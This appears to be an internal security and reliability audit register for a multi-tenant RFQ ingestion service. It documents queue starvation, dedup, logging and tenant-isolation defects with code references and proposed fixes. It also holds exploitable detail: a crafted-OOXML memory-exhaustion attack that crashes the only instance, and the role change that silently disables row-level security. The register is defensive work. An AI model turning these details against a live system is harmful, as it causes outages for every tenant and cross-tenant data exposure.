# Lead / RFQ Ingestion — Risk and Blocker Register

**Owner:** Security / Reliability Reviewer
**Phase:** 1 — read-only audit. No product code was changed to produce this document.
**Date:** 2026-08-06

## Evidence provenance

| Source | Detail |
|---|---|
| Production database | Neon `neondb`, PostgreSQL 17.10, read via `psql`, **SELECT only**. No statement in this register mutated production. |
| Production service | Render `srv-d9csjhe1a83c739phue0`, `ASPNETCORE_ENVIRONMENT=Production` |
| Live endpoints | `GET /health`, `GET /ready` probed anonymously |
| Code | `Backend/ERP_RFQ_Automation/` at `ae0bd8b` on `release/nexora-v2-v3-accelerated`. All paths below are relative to that directory unless prefixed `Frontend/`. |

**Counts move.** Ingestion is live; `Leads` went 44 → 46 → 47 → 51 during the audit window. Every
figure is quoted against the `n` it was measured with. Nothing here is inferred from a count alone.

## Deployed configuration (fetched from Render, load-bearing for several findings)

```
DocumentInspection__Scanner__Provider = BuiltIn        ← structural inspection, NOT anti-virus
EvidenceStorage__Provider             = Local          ← IsDurable = false
Storage__RootPath                     = /var/data/nexora/uploads
Storage__EnforcePersistentMount       = true
Notifications__Provider               = console
Ollama__BaseUrl                       = https://ollama.com/   ← hosted, so every AI call is External class
Ollama__Model                         = deepseek-v4-pro
Database__AllowManagedOwnerRoleMigrationCompatibility = true
ASPNETCORE_ENVIRONMENT                = Production
```

## Verdict

| | S1 | S2 | S3 | S4 |
|---|---|---|---|---|
| Product defects | **5** | 9 | 8 | 4 |
| Technical debt | 0 | 3 | 3 | 1 |
| External dependencies | 1 | 2 | 1 | 0 |

**No cross-tenant read or write was proven.** Tenant isolation is genuinely defended in depth and
the database layer was verified empirically (§B1). The blocking risks are **integrity, availability
and truthfulness**, not confidentiality:

1. One poisoned row can still halt ingestion **for every tenant** (R-REL-01).
2. An amendment can still become an unrelated new RFQ (R-ID-02).
3. The first operator to use the match-review queue destroys the customer's own RFQ reference and
   part numbers (R-ID-03).
4. 30 real customer documents are labelled **"Cleared"** in green by an engine that only detects the
   68-byte EICAR test string (R-SEC-01).
5. 15 permanently-lost documents report as **zero unresolved dead-letters** (R-REL-02).

Each maps to a charter §6 NO-GO condition: silent loss, duplicate corruption, broken revision
lineage, unrecoverable worker failure.

## Production drop-off funnel (2026-08-06)

```
source_documents ingested                       86
  ├─ Quarantined, never queued                  54   (63%)  — ClamAV outage 2026-07-28/29
  ├─ Cleared   (engine = Nexora.EICAR)          30
  └─ Rejected  (engine = Nexora.EICAR)           2
source_document_occurrences (arrival events)   289
  ├─ Rejected (terminal, no lead)              212   (73%)
  │    ├─ document_quarantined                 155
  │    ├─ source_object_unavailable              48
  │    └─ document_rejected                       9
  └─ Resolved                                   77
ExtractionJobs                                  57
  ├─ Succeeded                                  35
  └─ DeadLetter                                 22   (39%)  — all 22 have no occurrence link
LeadIngestionOccurrences                        47 → 51      — 100% Classification = 'New'
Leads                                           47 → 51
```

86 documents in, 51 leads out. Every one of the 51 came from a document cleared by the EICAR stub.
**Not one has ever been classified as a duplicate, a revision or a possible match.**

---

# A. PRODUCT DEFECTS

Defects in Nexora's own code. Fixable without a third party.

## A1 — Severity S1

### R-ID-02 (S1) — a high-similarity amendment is discarded and a new canonical RFQ is created

**Evidence.** `LeadIdentity/LeadIdentityApplicationService.cs:165-166`:

```csharp
if (ranked is not null && (groupedLeadIds.Contains(ranked.Lead.Id)
    || scope is null || CustomerScope(ranked.Lead, null) is null))
```

A possible match is raised **only when customer identity is unresolved**. When the incoming document
*and* the candidate lead both resolve a customer scope — the normal, healthy case — and there is no
`LogicalGroupKey`, the condition is false, control falls through to `:184-197`, and a **new `Lead`,
new `LeadRevision` #1 and new `CommercialCaseReference`** are minted. `LogicalGroupKey` is populated
on **0 of 47** production occurrences, so the first disjunct never rescues it.

**Failure scenario.** A buyer already in Nexora emails an amended RFQ. The reference string changed
(`RFQ-4471` → `RFQ-4471 Rev B`) or is absent — 12 of 47 production leads carry no `RFQNo` at all. The
line items are byte-identical, so `Similarity()` returns **1.00**. Both scopes resolve, because the
buyer's email is known. The match is thrown away. The client sees two RFQs with two Nexora numbers
for one enquiry, and no signal that they are related.

**Production corroboration** — the shape already exists in the data. Same tenant + same normalised
customer scope + same normalised customer RFQ reference, yet separate canonical RFQs:

```
 scope                    | norm_rfq   | leads | lead_ids      | refs
 manualuploadcom          | 41600      |     3 | {398,399,406} | NXR-2026-000007/-000008/-000015
 infointelliflowsystemcom | 6000281833 |     2 | {392,407}     | NXR-2026-000001/-000016
 infointelliflowsystemcom | 9500198197 |     2 | {395,402}     | NXR-2026-000004/-000011
```

All seven classified `New`. *(All seven are `SourceChannel='Legacy'` backfill rows, so they evidence
the data shape rather than a live execution of the current code. The live defect is established by
reading `:161-166`.)*

**Fix.** Raise `PossibleMatchReviewRequired` whenever `ranked.Score >= 0.65`, regardless of whether
both scopes resolve. Treat an *equal* resolved scope as **corroborating** evidence — raise the score,
or auto-revision — never as grounds to suppress. Never fall through to `New` while a ≥0.65 candidate
exists. Regression test: same buyer, no RFQ reference, identical line items, second ingest → assert
**not** `New`.

---

### R-ID-03 (S1) — the human match-review decision overwrites the canonical lead with normalised hash text and drops every other field

**Evidence.** `LeadIdentityApplicationService.cs:961-977` (`ApplySnapshotProjection`), reached from
`:715` (`revision` / `link`) and `:730` (`create_new`).

`Snapshot()` (`:844-847`) exists to feed a SHA-256 fingerprint, so it stores only `Normalize()`d
values — lowercased, every non-alphanumeric stripped. `ApplySnapshotProjection` then writes that
snapshot **back onto the canonical `Lead`**:

```csharp
lead.Rfqno     = StringProperty(root, "rfq");     // :965
lead.BuyersName= StringProperty(root, "buyer");   // :966
if (lead.Id != 0) { _db.RemoveRange(lead.LeadItems); lead.LeadItems.Clear(); }   // :970
foreach (var item in items.EnumerateArray())
    lead.LeadItems.Add(new LeadItem { LineItemNo = …, ManufacturerPartNumber = …,
        ProductShortDescription = …, Quantity = …, UnitOfMeasure = … });          // :972-975
```

Consequences on one operator click:

| Field | Before | After |
|---|---|---|
| `Lead.Rfqno` | `RFQ-2026/0012` | `rfq20260012` |
| `Lead.BuyersName` | `John Smith` | `johnsmith` |
| `LeadItem.ManufacturerPartNumber` | `AB-123/X` | `ab123x` |
| `LeadItem.ProductShortDescription` | `1/2" SS Ball Valve, 300#` | `12ssballvalve300` |
| `UnitPrice`, `Currency`, `CustomerRfqno`, `ItemMaterialCode`, `ManufacturerName`, `LeadTime`, `BidClosingDateLine`, `Aiconfidence`, `ExtraFields` | populated | **deleted** |

The verbatim text is **not recoverable**: `LeadRevision.SnapshotJson` and `LeadRevisionDifferences`
are normalised too. The only surviving copy is the source document itself.

The **automatic** revision path is unaffected — `ApplyCurrentProjection` (`:834-841`) uses
`CloneCurrentItem` (`:979-990`) and preserves all 22 item fields. The defect is confined to the
human-decision path.

**Blast radius today: zero.** `SELECT count(*) FROM "LeadMatchCandidates";` → **0**, and
`LeadReviewAudits` → **0**. No production data is corrupted. **But** the queue is reachable from the
shipped sidebar (`Frontend/src/components/layout/Sidebar.tsx:167` → `App.tsx:298`), so the first
operator to demonstrate FR-RFQ-06 during a pilot triggers it.

**Fix.** The revision snapshot is a *hash input*, not a *state document*. Persist a verbatim snapshot
alongside it, or carry the incoming `Lead` through the review decision exactly as the automatic path
does. Make `ApplySnapshotProjection` merge only genuinely changed fields. Regression test asserting
`Rfqno`, `ManufacturerPartNumber`, `UnitPrice` and `Currency` survive a `revision` decision.

---

### R-REL-01 (S1) — one poisoned row can still starve the claim loop for every tenant

This is the 2026-08-05 incident class. **No hardening has been added since.** The deployed trigger
body is byte-identical to `Migrations/20260725035352_Release01CTransactionalIntakeHardening.cs:173-188`;
the last migration touching the claim path is `20260730193414_SynchronizeSharedExtractionOccurrences`,
five days before the incident.

**The trigger is row-scoped, not a whole-table invariant** — I checked. Deployed
`nexora_release01b_intake_before_claim_guard` predicate is `occurrence.id = NEW."SourceDocumentOccurrenceId"`.
So one bad row does not directly invalidate others. **It starves the queue anyway, by head-of-line
blocking, and the mechanism cannot self-heal:**

1. `Extraction/ExtractionQueue.cs:107-127` — the `candidate` CTE selects the winner with
   `ORDER BY Priority DESC, SchedulerTag ASC, CreatedOn ASC … LIMIT 1`. Fully deterministic, no
   jitter. **It never joins `source_document_occurrences`**, so a poisoned job is still selected.
2. The trigger raises `23514`. `ClaimAsync` (`ExtractionQueue.cs:282-304`) holds **no savepoint** —
   `await using var transaction` disposes and rolls the whole statement back.
3. The rollback discards the `Attempts = Attempts + 1` at `ExtractionQueue.cs:132`. **`Attempts`
   never increments, so the poison pill can never reach `MaxAttempts` and can never dead-letter
   itself.**
4. `ExtractionWorker.cs:138-144` catches, logs, waits `IdlePollDelay` (2 s, `:40`) and loops —
   re-selecting the same job forever.

`SKIP LOCKED` does not help: the row is not lock-contended and the trigger raises in microseconds, so
all four worker loops (`ExtractionWorker.cs:28`) converge on it. **The claim is global, not
per-tenant — one tenant's poisoned row halts every tenant.** The only symptom is a repeating log line.

**Current production state: clean.** Simulating the guard across every claimable job returns zero
rows that would raise:

```sql
SELECT j."Id", j."Status", o.intake_status FROM "ExtractionJobs" j
JOIN source_document_occurrences o ON o.id = j."SourceDocumentOccurrenceId"
 AND o.business_unit_id = j."BusinessUnitId"
WHERE j."Status" IN ('Queued','Pending','Retryable','Leased','Extracting','Persisting')
  AND o.intake_status NOT IN ('Queued','Retryable','Processing');
→ (0 rows)
```
`SELECT count(*) … WHERE o.extraction_job_id IS DISTINCT FROM j."Id";` → **0**. No occurrence sits in
`Accepted`. No pill is armed today.

**Correction to an earlier hypothesis, verified.** All 22 dead-lettered jobs have
`SourceDocumentOccurrenceId IS NULL`, which superficially looks like 22 armed pills — a NULL link
makes the guard's `NOT EXISTS` trivially true. It is **not** armed: the operator re-drive path takes
the else-branch at `ExtractionDeadLetterService.cs:246-331`, **creates** an occurrence, and calls
`occurrence.BindExtractionJob(job.Id)` at `:313` — and `BindExtractionJob`
(`DocumentIntelligence/Persistence/EvidenceLedgerEntities.cs:605-616`) sets
`IntakeStatus = Queued`, which the guard accepts. Re-drive repairs the link rather than arming the pill.

**The real arming window** is the unprotected gap in `Extraction/DocumentIngestionService.cs`: tx1
commits at `:231` writing the occurrence as `Accepted`; malware scan (`:260-263`) and object write
(`:266-267`) happen **outside any transaction**; tx2 (`:270-403`) binds the job and moves the
occurrence to `Queued`. The advisory lock `evidence-ingest:{BU}:{hash}` is `pg_advisory_xact_lock`
(`:161`, `:274`) — released at each commit, **not held across the gap**. A crash there leaves a
durable `Accepted` occurrence with no job: an invisible dropped document, and the raw material for
the pill. Nothing reconciles that state.

**Fix — all three, in order.**
1. Add the occurrence-state predicate to the `candidate` CTE (`ExtractionQueue.cs:113-123`) so the
   scheduler *skips* poisoned rows instead of the trigger *rejecting* them:
   `AND EXISTS (SELECT 1 FROM source_document_occurrences o WHERE o.business_unit_id = j."BusinessUnitId" AND o.id = j."SourceDocumentOccurrenceId" AND o.extraction_job_id = j."Id" AND o.intake_status IN ('Queued','Retryable','Processing'))`
2. Make the failure self-limiting: wrap the claim `UPDATE` in a savepoint, or catch `23514` in
   `ClaimAsync` and issue a separate **committed** `UPDATE … SET Attempts = Attempts + 1, LastError = 'intake guard'`
   so the pill exhausts and dead-letters.
3. Merge tx1 and tx2 in `DocumentIngestionService`, or add a sweeper that promotes/rejects any
   occurrence left in `Accepted` past a threshold.

---

### R-REL-02 (S1) — 15 permanently-lost documents report as zero unresolved dead-letters

**Evidence.** `Extraction/ExtractionDeadLetterService.cs:72`:

```csharp
.Where(x => x.SecurityBlocker || x.Resolution != ExtractionDeadLetterAction.SourceObjectUnavailable)
```

`Controllers/OperationsReadinessController.cs:35-50` applies the same exclusion to the readiness
count. 15 of the 22 dead-lettered jobs have `StoragePath` under `/app/Uploads/…` — a container path
from a **previous deployment**. Current storage is `/var/data/nexora/…`
(`select split_part(object_bucket,':',1) …` → `local | 86`). Those bytes are gone, and 48 occurrences
carry `last_error_code = 'source_object_unavailable'`.

**Failure scenario.** A deployment changes the storage root. Every in-flight job's absolute
`StoragePath` is orphaned. Operators re-drive, receive `SourceObjectUnavailable`, and the jobs
**disappear from the dashboard**. Readiness stays green while documents are permanently lost. This is
charter §1's "nothing disappears silently" violated by the very surface built to prevent it.

**Fix.** Keep `SourceObjectUnavailable` visible as a distinct terminal bucket — *"Lost — bytes
unrecoverable"* — rather than filtering it out. Alert when the count is non-zero. Make `StoragePath` a
storage-root-**relative** key so a root change cannot orphan evidence.

---

### R-REL-03 (S1) — three intake doors share one idempotency key, so files 2..N are silently dropped

**Evidence.** `Extraction/DocumentIngestionService.cs:621-643` composes the occurrence key as
`$"{batchId:D}:{sourceType}:{sha256(SourceOccurrenceId ?? "fallback:{EmailIngestId}:{LogicalGroupKey}")}"`.
When `SourceOccurrenceId` is null **and** the batch id is shared across files, every file in the batch
composes the **identical** key `…:sha256("fallback::")`, and file #2 hits `:212-215`:

```csharp
else if (occurrence.SourceDocumentId != source.Id)
    throw new InvalidOperationException("The intake idempotency key is already bound to different document content.");
```

| Door | file:line | Result for files 2..N |
|---|---|---|
| `Services/ManualUploadService.cs:397, 428-431` | shared `batchId`, **no metadata at all** | throws → `:437-442` increments `skipped`, logs. **Silent loss** |
| `Controllers/ExtractionController.cs:81-83, 99-101` | shared `batchId`; `SourceOccurrenceId` set **only when the client sends an `Idempotency-Key` header** | `:155-161` returns `outcome:"Error"` in the body, **no durable row** |
| `Services/FolderService.cs:254-260` | shared `report.BatchId` (`:23`), metadata carries no `SourceOccurrenceId` | durable retry, quarantine after 3 sweeps — but **a watched folder can only ever ingest one file per sweep** |

Unaffected (correct per-file keys): `ManualUploadController.cs:78-80, 134-136`,
`LeadUploaderController.cs:76`, `SupplierQuoteDocumentIntakeService.cs:77`.

**Currently masked, not fixed.** The shipped UI does send the header — production batch
`348dcc4a-…` has 43 occurrences with 43 distinct key suffixes. Any other client, a UI regression, or
the folder/legacy paths bite immediately.

**Fix.** Make `SourceOccurrenceId` **mandatory** in `IDocumentIngestion.IngestAsync`; derive
`{batchId}:{fileIndex}:{fileName}` at the three offending call sites rather than permitting null.

---

### R-SEC-01 (S1 for pilot honesty; S2 technically) — 30 customer documents are labelled "Cleared" in green by an EICAR string matcher

**What the deployed engine does.** `DocumentInspection__Scanner__Provider = BuiltIn` →
`Security/DocumentInspection/MalwareScannerProvisioning.cs:206-209` → `EicarMalwareScanner`
(`MalwareScanners.cs:8-58`), which searches for exactly one 68-byte literal and **returns `Clean` for
everything else**. The code is honest about itself (`MalwareScannerProvisioning.cs:18-23`: *"This is
NOT an anti-virus engine and detects no real malware"*), and `render.yaml:1-13, 74-84` declares the
deferral with a cost figure and a runbook. **The defect is not the choice — it is that nothing
downstream repeats it.**

**Production.**
```
 security_status | malware_verdict_status | malware_scanner_engine | count
 Quarantined     |                        |                        |    54
 Cleared         | Clean                  | Nexora.EICAR           |    30
 Rejected        | Clean                  | Nexora.EICAR           |     2
```
30 real customer documents — 77 of 86 are legacy `application/msword` OLE, the classic macro/exploit
carrier — carry a **`Clean` verdict issued by an EICAR string matcher**. Two rows are `Rejected` while
still advertising `Clean`, because `MarkSecurityStatus` permits `Cleared → Rejected`
(`EvidenceLedgerEntities.cs:334`) without clearing the verdict.

**Where users see it:**

| Surface | file:line | Rendered | Actual meaning |
|---|---|---|---|
| Duplicate uploads | `Frontend/src/pages/Leads/DuplicateUploadsPage.tsx:149-150` | **green** chip `Cleared` | EICAR string absent |
| Archive | `Frontend/src/pages/PlatformGovernance/CommercialDocumentArchivePage.tsx:119` | **green** chip `Cleared` | ditto |
| Commercial inbox | `Frontend/src/pages/Procurement/SupplierQuotes/CommercialInboxPage.tsx:17` | raw status under `Security / Processing` | ditto |
| Batch reconciliation | `Frontend/src/pages/Leads/LeadIngestionBatchPage.tsx:287` | `Security Cleared updated <time>` | ditto |
| Inspection reason | `DocumentFileInspectionService.cs:161-172` | *"File signature, archive safety, and malware checks passed."* | no malware check occurred |
| Intake copy — **latent** | `Frontend/src/utils/intakeErrors.ts:175-182` | *"Security scan passed" / "This file was scanned and no malicious content was found."* | ditto |

The `intakeErrors.ts` string is **latent, not active**: `security_scan_cleared` is set at
`DocumentFileInspectionService.cs:170` but a cleared file throws no exception, so it never reaches
`ExtractionController.cs:133`, and production has zero occurrences carrying that code. It is **one
wiring change** from becoming the most direct false statement in the product. The green chips are
**active today**.

**Compounding: the fake verdict is reusable.** `HasFreshCleanMalwareVerdict`
(`EvidenceLedgerEntities.cs:298-304`) treats `MalwareVerdictStatus == "Clean"` as a valid
skip-the-scan token for 24 h, so a future ClamAV rollout silently inherits 30 fake clean verdicts.

**Failure scenario.** A supplier's compromised mailbox sends a weaponised `.doc`. Macros are caught
(genuinely — see §F), but a non-macro exploit is not. Nexora stores it, marks it `Cleared`, and shows
a sales user a green chip. The user downloads it via `/api/File/attachment/{id}` and opens it in Word.
**Nexora's own UI supplied the assurance.**

**Fix.** (1) Stop writing `MalwareScanStatus.Clean` when the engine is `Nexora.EICAR` — introduce and
persist `NotScanned`. (2) Render `Not scanned (structural checks only)` in amber whenever
`malware_scanner_engine` is not a real AV. (3) Delete or gate `intakeErrors.ts:175-182` behind a real
engine. (4) Refuse verdict reuse for non-AV engines.

---

## A2 — Severity S2

### R-SEC-02 (S2) — no surface tells an operator that no anti-virus is configured, and `/ready` is saturated

`HealthChecks/MalwareScannerHealthCheck.cs:28-32` probes with an EICAR file and asserts `Infected`.
The EICAR-only scanner **passes by construction**. Live:

```
GET /health → 200 Healthy
GET /ready  → 503 Unhealthy
```

`/ready` is 503 **permanently and by design** — `HealthChecks/EvidenceStorageHealthCheck.cs:16-18`
returns `Unhealthy` whenever `!IsDurable`, and `LocalEvidenceObjectStorage.IsDurable => false`
(`Infrastructure/Storage/IEvidenceObjectStorage.cs:94`) with production on `EvidenceStorage__Provider=Local`.
`render.yaml:19-24` acknowledges this and points the platform probe at `/health`.

Consequences:
- **A real scanner outage would be invisible.** If ClamAV were deployed and died, `/ready` would go
  from `Unhealthy` to… `Unhealthy`. The one signal designed to catch it is already saturated.
- `Controllers/OperationsReadinessController.cs:109-110` emits `ReadinessCheck(Name, Status, DurationMs)`,
  so an operator sees literally `malware-scanner: Healthy`. `MalwareScannerSelection.ProviderName` is
  available but interpolated only on the **unhealthy** branch (`MalwareScannerHealthCheck.cs:46-52`).
- The `REDUCED SECURITY POSTURE` warning (`MalwareScannerProvisioning.cs:247-258`) is written once per
  boot to stdout and never again.

**Fix.** Add `provider` and `isReducedSecurityPosture` to `ReadinessCheck`; degrade `malware-scanner`
to `HealthStatus.Degraded` when `selection.IsReducedSecurityPosture`; split evidence durability into
its own non-`ready` tag so `/ready` regains signal.

### Scanning-policy mode assessment (master prompt §7)

**Mode in force: Pilot Deferred. Explicit in declaration, accidental in operation.**

- **Explicit** at the infrastructure layer. `render.yaml:1-13, 74-84` names the provider, states it is
  *"NOT an anti-virus engine"*, gives the cost (+$85/mo), the runbook (`docs/RUNBOOK-CLAMAV-RENDER.md`)
  and the instruction *"Restore ClamAV before any production tenant uploads documents."* The code is
  fail-closed by default (`MalwareScannerFactory.Select:130-150` — absent or unrecognised config
  yields ClamAV outside Development). This is a deliberate, declared, reversible decision and should
  be credited as such.
- **Accidental** everywhere a human actually looks: readiness says `Healthy`, the tenant UI says
  `Cleared` in green, the ledger says `Clean` — and **the render.yaml precondition has already been
  violated**: 30 tenant documents were ingested under it.

The deferral is explicit; the **degradation** is not. That gap is the finding, and it is what must be
closed before a pilot — either deploy ClamAV, or make the reduced posture visible everywhere the word
"Cleared" appears.

---

### R-SEC-03 (S2) — unbounded `[Content_Types].xml` materialisation kills the single production instance

Every OOXML entry is streamed through a pooled 80 KB buffer and never materialised — **except one**.
`Security/DocumentInspection/DocumentFileInspectionService.cs:316-342`:

```csharp
using var captured = entry.FullName.Equals("[Content_Types].xml", …) ? new MemoryStream() : null;
    captured?.Write(buffer, 0, read);                        // :331 — bounded only by the 256 MB entry cap
contentTypes = StrictUtf8.GetString(captured.ToArray());     // :341
```

A 25 MB upload can legally carry a `[Content_Types].xml` expanding to ~200 MB — under the 256 MB entry
cap, under the 256 MB total cap, at a ~285× ratio that clears the 300× tripwire. Peak allocation:
MemoryStream (~256 MB after doubling) + `ToArray()` copy (~200 MB) + UTF-16 string (~400 MB) ≈
**850 MB**. The Render service is `plan: starter` (512 MB) with `numInstances: 1`. **A single ~1 MB
HTTP request is a full multi-tenant outage.** The archive is ultimately rejected at `:387` — but the
OOM happens first.

**Amplifier.** `Platform/Hardening/RateLimitingExtensions.cs:71` defines `UploadPolicy` at 30 req/min
"for heavy endpoints such as uploads" — but `[EnableRateLimiting(UploadPolicy)]` appears at **zero
call sites**. Every upload endpoint falls back to the global 600 req/min limiter.

**Fix.** Cap the capture at a realistic manifest size (64 KB is generous) and reject above it, or
parse with a streaming `XmlReader`. Apply `[EnableRateLimiting(RateLimitingExtensions.UploadPolicy)]`
to `ExtractionController.UploadBatch`, `ManualUploadController.UploadFiles`,
`EmailController.UploadLeadsToFolder`.

---

### R-SEC-04 (S2) — raw customer document text and buyer PII are logged at Information in production

`Services/FolderService.cs:733-735`:

```csharp
var preview = extractedText.Length > 500 ? extractedText.Substring(0, 500) : extractedText;
_logger.LogInformation("Extracted text preview: {Preview}...", preview.Replace("\n"," ").Replace("\r"," "));
```

500 characters of the parsed customer document, verbatim, at **Information** — and `appsettings.json`
sets `"Default": "Information"` with **no** `appsettings.Production.json` override. The top 500
characters of an RFQ is precisely the header block: buyer company, contact name, address, RFQ number,
bid-closing date. This lands in Render's log stream, which has a different access-control boundary and
retention policy from the tenant-scoped database.

Same class, also live: `FolderService.cs:1015` (`Buyer=`, `Vendor=`), `Services/EmailService.cs:718`
(buyer name), `EmailService.cs:286,505,518,536,544,641,649,655` (inbound subjects — buyer company,
project, RFQ reference), `EmailService.cs:1292` (recipient + tenant mailbox + SMTP host/port),
`Services/ManualUploadService.cs:302`, `Notifications/NotificationService.cs:194,202`,
`Notifications/Providers/SmtpEmailSender.cs:49,58` and `SendGridEmailSender.cs:65,74` (rendered
subjects, which templates interpolate with `{{buyerCompany}}` — `EmailTemplates.cs:140,178,252`),
`Services/QuotationUploaderService.cs:229` (the only interpolated-string log call in the ingestion
tree, so it cannot be filtered by a structured sink).

**The structural finding.** There is **no log redaction helper anywhere in the codebase**. The only
PII redaction that exists is *egress-only* — `Services/OllamaLlmService.cs:295-296` strips emails and
phones before sending to an **external** AI provider, gated on `_providerClass != External` (`:289-290`).
Meanwhile `AI/AiGovernanceModels.cs:105-107` models `RedactionRequired` / `EgressPolicy = "RedactedFieldsOnly"`
as a **tenant-visible governance posture**. The product advertises a redaction stance the logging path
does not honour.

**Fix.** Delete `FolderService.cs:735`. Strip buyer names and subjects from Information-level logs.
Add the scrubbing layer the AI governance model already promises.

---

### R-SEC-05 (S2) — `nexora_pipeline_app` is BYPASSRLS and 122 tables are ENABLE-but-not-FORCE

Two structural weakenings of an otherwise strong isolation design (see §B1 for what was verified).

**(a) The pipeline role bypasses RLS.** `pg_roles` → `nexora_pipeline_app | rolbypassrls = t`.
Empirically confirmed: `SET LOCAL ROLE nexora_pipeline_app` with a foreign GUC returns **every
tenant's rows**. `MultiTenancy/TenantRlsCommandInterceptor.cs:243` selects it whenever
`HttpContext is null` and no tenant scope is pushed:

```csharp
if (httpContext is null) return businessUnitId.HasValue ? TenantRole : PipelineRole;
```

Every ingestion table grants it full DML. So for the extraction worker, email poller, folder watcher,
SLA sweep, routing reconciler and billing meter, **the only isolation is the hand-written
`BusinessUnitId ==` predicate plus `_tenantScope.Push()`**. The 15 `Push()` sites
(`Extraction/ExtractionWorker.cs:161`, `Services/EmailBackgroundService.cs:135`,
`AI/AiGovernanceService.cs:189,354,389`, …) are all correct today — but one new worker that forgets
`Push()` and calls `IgnoreQueryFilters()` is an unbounded cross-tenant read with nothing beneath it.

**(b) 122 of 202 RLS tables are `ENABLE` without `FORCE`** — including `source_documents`,
`source_document_occurrences`, `field_evidence`, `document_pages`, `document_regions`,
`extraction_runs`, `ExtractionJobs`, `LeadItems`, `Attachments`. They rely on the runtime login role
not being the table owner. That holds today (`nexora_runtime`, `rolbypassrls = f`, verified in
`pg_stat_activity`). But `render.yaml:100-101` sets
`Database__AllowManagedOwnerRoleMigrationCompatibility=true`, `Program.cs:636` reuses the runtime
username for migrations, and `ConnectionStrings__DefaultConnection` is `sync: false` — so a future
operator repointing it at `neondb_owner` (BYPASSRLS, owner of all 207 tables) **silently disables RLS
on 122 tables with no error and no test failure**. The code's own comment
(`TenantRlsCommandInterceptor.cs:199-207`) records a verified `postgres:16` repro of exactly this.

**Fix.** `ALTER TABLE … FORCE ROW LEVEL SECURITY` on the 122, ingestion subset first — this is the
single highest-leverage change in the register, because it makes tenant isolation independent of which
role the connection string names. Then make `nexora_pipeline_app` `NOBYPASSRLS` and convert the worker
sweeps to an explicit per-tenant `SET LOCAL` loop. Extend the existing guardrail
`PostgreSqlProductionDialectTests.AllMigrationsApplyToAnEmptyPostgreSqlDatabase` (referenced at
`Models/ErpRfqAutomationContext.Tenancy.cs:613-618`) to assert `relforcerowsecurity`, so this cannot
regress.

---

### R-ID-01 (S2) — UoM canonicalisation drifted the stored dedup fingerprints; historical rows were not backfilled

Commit `6ff5637` changed `ItemSnapshot` and `LineIdentityFingerprint` from `Normalize(x.UnitOfMeasure)`
to `NormalizeUom(...)` (`LeadIdentityApplicationService.cs:847, :853, :863` →
`Services/Uom/UomCanonicalizer.cs:288-297`). Stored `LogicalInquiryFingerprint` values written before
that commit hash the raw spelling; the same document re-ingested today hashes the canonical code.

**Quantified against production.** Seven stored spellings drift — `each`→`ea`, `pcs`→`ea`, `Pcs`→`ea`,
`piece`→`ea`, `NOS`→`ea`, `Kit`→`set`, `Activ.unit`→`au`:

```
 leads_with_stale_fingerprint | 10 of 46   (21.7%)
 items_drifting               | 2,898 of 3,121   (92.9%)
 occurrences_stale            | 10
 revisions_stale              | 10
```

**Assessment: NOT a pilot blocker. S2 debt with a mandatory pre-pilot backfill.** Reasoning from the
code paths, not the change description:

- `Similarity()` (`:872-881`) recomputes `LineIdentityFingerprint` from the **live entities on both
  sides** at comparison time. It never reads a stored fingerprint, so similarity matching is
  **immune** to the drift.
- Only two comparisons read a *stored* fingerprint: the exact-duplicate arm (`:105`) and the
  revision-identity check (`:205`).
- When those miss, control does **not** default to `New` — it falls to the strong scope+reference arm
  (`:125-139`) and then to similarity (`:161-182`). The stored fingerprint is **never the sole gate on
  creating a canonical RFQ**, so drift alone cannot cause a silent duplicate canonical record or
  silent loss.

**What it does cause**, on the 10 affected leads: a genuine re-send is **downgraded from
`ExactDuplicate` to `Revision`**, and the resulting diff shows a *phantom unit change on every single
line* (`each` → `EA`). The operator is shown a fabricated amendment. That is a credibility defect in
front of a client, not a data-loss defect.

**Condition.** The backfill must land **before** the pilot corpus is loaded, otherwise every
historical document in the demo set re-ingests as a fake amendment.

**Fix.** A migration recomputing `LogicalInquiryFingerprint` on `LeadIngestionOccurrences` and
`LeadRevisions` and `Leads.CurrentInquiryFingerprint`, plus a `PolicyVersion` guard so a future
fingerprint change is detected rather than silently degrading.

---

### R-ID-04 (S2) — duplicate and revision recall decays to zero past 250 leads per tenant

`LeadIdentityApplicationService.cs:121-123`:

```csharp
var candidates = await _db.Leads.Include(x => x.LeadItems)
    .Where(x => x.BusinessUnitId == candidate.BusinessUnitId)
    .OrderByDescending(x => x.CreatedDate).Take(250).ToListAsync(ct);
```

The unbounded DB path (`strongLeadId`, `:125-130`) fires only when the candidate lead's occurrence
carries a non-null `CustomerScopeKey`. The scope fallback (`:134-136`) and **all** similarity ranking
(`:147-164`) see only the 250 most recent leads. At the charter's 900 inquiries/month that is roughly
**8 calendar days** of history. Beyond it, revisions and possible matches for older inquiries silently
reclassify as `New`.

Compounding: the Legacy backfill left `CustomerScopeKey` NULL on all 23 backfilled occurrences
(`Legacy 23 → 0`, `ManualUpload 24 → 22`), so **half the existing canonical corpus is unreachable by
the unbounded path** and depends entirely on the 250-row window.

Also a cost: `.Include(x => x.LeadItems)` materialises 250 leads with all items on **every** ingest —
at production's ~68 items/lead that is ~17,000 entities per document.

**Fix.** Replace the scan with an indexed candidate query (`CustomerScopeKey`, normalised RFQ
reference, or line-identity fingerprint via an index on `LeadItemRevisions.LineFingerprint`). Backfill
`CustomerScopeKey` on the 23 Legacy occurrences. **Alert when the classification histogram is 100%
`New` over a rolling window** — that ratio is itself the health signal that dedup is dead, and it
would have caught this months ago.

---

### R-REL-04 (S2) — reconciliation idempotency is ordinal-bound, so a non-deterministic LLM can rebind content

`ExtractionWorker.cs:924` keys on `$"extraction:{BU}:{job.Id}:inquiry:{i+1}"` — the **position** of the
inquiry in the extractor's output, not its content. `ChunkedExtractionService` splits documents via
`MultiInquirySplitter`; the LLM is non-deterministic.

**Failure scenario.** Attempt 1 yields 2 inquiries → leads A and B under `…:inquiry:1` and
`…:inquiry:2`. The job later retries (lease loss, storage blip) and attempt 2 yields 3 inquiries in a
different order. The replay guard at `LeadIdentityApplicationService.cs:90-102` matches `inquiry:1`
and `inquiry:2` onto A and B — **returning them unchanged while silently discarding the newly
extracted content** — and `inquiry:3` creates a spurious third lead. The occurrence→lead mapping is
now wrong and nothing audits it.

**Fix.** Key on content: `$"extraction:{BU}:{job.Id}:inquiry:{Fingerprint(leads[i])}"`.

---

### R-REL-05 (S2) — `ExtractionJobs` has no unique index on `(BusinessUnitId, ContentHash)`, contradicting its own contract

`ExtractionQueue.cs:20-21` states *"exactly-once is guaranteed by the unique (BusinessUnitId,
ContentHash) index"*. Production has only `IX_ExtractionJobs_BU_ContentHash btree` — **non-unique**.
